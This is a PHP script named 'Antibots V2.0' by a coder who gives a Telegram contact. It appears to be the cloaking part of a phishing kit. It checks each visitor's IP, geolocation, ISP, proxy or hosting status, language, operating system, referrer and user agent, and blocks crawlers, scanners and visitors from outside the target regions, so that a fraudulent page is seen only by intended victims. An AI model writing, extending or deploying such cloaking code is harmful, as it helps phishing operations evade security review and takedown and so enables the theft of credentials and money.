<?php
session_start();
#session_destroy();
require_once 'antibots-config.php';
require_once 'antibots-functions.php';
/* ************ Antibots V2.0 ************ */
# Language : PHP
# Coder    : @Davidluna27
# [+] Contact :    t.me/Davidluna27   
/*
-------------------------------------------------
*/

#Cloacker Configuration
$ip = getIP();
$geolocation_data = geolocationIp($ip);
@$proxy = $geolocation_data["proxy"];
@$hosting = $geolocation_data["hosting"];
@$country_code = $geolocation_data["countryCode"];
@$isp = $geolocation_data["isp"];

    
if (!filter_var($ip, FILTER_VALIDATE_IP) or getOs(getUag()) == 'Unknown OS Platform' or matchKey("IPs", 'ip')) {
    debug("Unknown OS Platform/Ip Baned");
    visitorInfo();
    $_SESSION["allowed"] = false;
}else {

    if ($comprobate_language == true) {
        if (!comprobateLang($languages_allowed) || !isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) or $_SERVER['HTTP_ACCEPT_LANGUAGE'] == '*') {
            debug("comprobate lang");
            visitorInfo();
            $_SESSION["allowed"] = false;
        }
    }
    
    if ($comprobate_bots == true) {
        if (matchKey("crawlers1") or matchKey("crawlers2") or checkUag()) {
            debug("comprobate uag");
            visitorInfo();
            $_SESSION["allowed"] = false;
        }
    }
    
    if ($comprobate_bad_os == true) {
        if (comprobateBadOperateSystem(getUag(), $bad_operate_systems)) {
            debug("comprobate os");
            visitorInfo();
            $_SESSION["allowed"] = false;
        }
    }
    
    if ($comprobate_bad_referer == true) {
        if (comprobateBadReferrers(trafic($spreading))) {
            debug("comprobate referencia");
            visitorInfo();
            $_SESSION["allowed"] = false;
        }
    }

    if ($comprobate_proxy == true) {
        if (proxyDetection($ip) || $proxy == true || $hosting == true) {
            debug("comprobate proxy");
            visitorInfo();
            $_SESSION["allowed"] = false;
        }
    }

    if ($comprobate_country == true) {
        if (!comprobateCountry($countries_allowed, $country_code)) {
            debug("comprobate country");
            visitorInfo();
            $_SESSION["allowed"] = false;
        }
    }

    if ($comprobate_isp == true) {
        if (comprobateIsp($isp)) {
            debug("comprobate isp");
            visitorInfo();
            $_SESSION["allowed"] = false;
        }
    }

}
?>